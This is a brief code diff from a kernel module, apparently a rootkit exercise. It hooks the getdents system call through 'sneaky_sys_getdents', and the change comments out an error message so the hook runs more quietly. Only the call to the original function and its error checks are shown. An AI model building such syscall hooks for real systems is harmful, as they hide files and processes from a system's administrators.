@@ -73,7 +73,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
 
   nread = original_getdents(fd, dirp, count);
   if (nread == -1) {
-    printk(KERN_INFO "error: cannot operate original getdents");
+    //printk(KERN_INFO "error: cannot operate original getdents");
   }
   if (nread == 0) {
     return 0;
